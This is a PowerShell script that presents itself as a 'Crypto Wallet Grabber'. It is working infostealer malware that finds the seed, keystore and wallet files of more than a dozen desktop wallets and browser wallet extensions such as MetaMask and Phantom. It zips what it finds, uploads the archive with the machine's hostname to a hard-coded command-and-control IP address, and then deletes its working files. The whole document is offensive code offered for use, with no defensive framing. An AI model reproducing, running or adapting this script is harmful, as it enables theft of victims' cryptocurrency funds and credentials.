# XenoR2 Crypto Wallet Grabber v1.1
# Collects wallet files from common crypto wallets, zips, exfils to C2
# v1.1: diagnostic output for Get-ChildItem and Copy-Item failures
param([string]$C2Url = 'http://193.26.115.42:47821/api/cook')

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Resolve short names
try { $env:APPDATA = (Resolve-Path $env:APPDATA).Path } catch {}
try { $env:LOCALAPPDATA = (Resolve-Path $env:LOCALAPPDATA).Path } catch {}

$workDir = "$env:TEMP\xeno_wallets"
$zipPath = "$workDir\wallets.zip"

# Clean/create work dir
if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -EA SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# Wallet definitions: name -> [paths to grab]
$wallets = @{
    "Exodus" = @(
        "$env:APPDATA\Exodus\exodus.wallet\seed.seco"
        "$env:APPDATA\Exodus\exodus.wallet\info.seco"
        "$env:APPDATA\Exodus\exodus.wallet\twofactor.seco"
        "$env:APPDATA\Exodus\exodus.wallet\passphrase.json"
    )
    "Electrum" = @(
        "$env:APPDATA\Electrum\wallets\*"
    )
    "Atomic" = @(
        "$env:APPDATA\atomic\Local Storage\leveldb\*"
        "$env:APPDATA\atomic\config.json"
    )
    "Bitcoin Core" = @(
        "$env:APPDATA\Bitcoin\wallet.dat"
    )
    "Ethereum (geth)" = @(
        "$env:APPDATA\Ethereum\keystore\*"
    )
    "Litecoin Core" = @(
        "$env:APPDATA\Litecoin\wallet.dat"
    )
    "Dogecoin Core" = @(
        "$env:APPDATA\Dogecoin\wallet.dat"
    )
    "Monero GUI" = @(
        "$env:USERPROFILE\Documents\Monero\wallets\*"
    )
    "Jaxx Liberty" = @(
        "$env:APPDATA\Jaxx\Local Storage\leveldb\*"
    )
    "Guarda" = @(
        "$env:APPDATA\Guarda\Local Storage\leveldb\*"
    )
    "Coinomi" = @(
        "$env:APPDATA\Coinomi\Coinomi\wallets\*"
    )
    "Wasabi" = @(
        "$env:APPDATA\WalletWasabi\Client\Wallets\*"
        "$env:APPDATA\WalletWasabi\Client\BitcoinStore\*"
    )
    "Binance Chain" = @(
        "$env:APPDATA\Binance\Local Storage\leveldb\*"
    )
    "MetaMask (local)" = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\*"
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Local Extension Settings\ejbalbakoplchlghecdalmeeeajnimhm\*"
    )
    "Phantom (local)" = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa\*"
    )
    "Trust Wallet (local)" = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph\*"
    )
}

$found = @()
$totalFiles = 0

foreach ($walletName in $wallets.Keys) {
    $walletDir = "$workDir\$walletName"
    $grabbed = $false
    $walletFiles = 0

    foreach ($pattern in $wallets[$walletName]) {
        try {
            $items = @(Get-ChildItem -Path $pattern -EA Stop -Force)
        } catch {
            Write-Host "    [~] $pattern -- $_"
            $items = @()
        }

        if ($items.Count -gt 0) {
            if (-not $grabbed) {
                New-Item -ItemType Directory -Path $walletDir -Force | Out-Null
                $grabbed = $true
            }

            foreach ($item in $items) {
                $dest = "$walletDir\$($item.Name)"
                try {
                    if ($item.PSIsContainer) {
                        Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -EA Stop
                    } else {
                        Copy-Item -Path $item.FullName -Destination $dest -Force -EA Stop
                    }
                    $totalFiles++
                    $walletFiles++
                } catch {
                    Write-Host "    [!] Copy failed: $($item.FullName) -- $_"
                }
            }
        }
    }

    if ($grabbed) {
        $found += $walletName
        Write-Host "[+] $walletName -- $walletFiles files"
    }
}

if ($found.Count -eq 0) {
    Write-Host "[!] No wallets found"
    Remove-Item -Recurse -Force $workDir -EA SilentlyContinue
    exit 0
}

Write-Host "[*] Found $($found.Count) wallets, $totalFiles files"

# Compress
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

# Exfil
try {
    $headers = @{
        'X-Hostname' = $env:COMPUTERNAME
        'X-Tool'     = 'xeno-wallets'
    }
    $response = iwr -Uri $C2Url -Method POST -Headers $headers -InFile $zipPath -ContentType 'application/zip' -UseBasicParsing
    Write-Host "[+] Wallets exfil OK: $($response.StatusCode)"
} catch {
    Write-Host "[!] Wallets exfil failed: $_"
}

# Cleanup
Remove-Item -Recurse -Force $workDir -EA SilentlyContinue
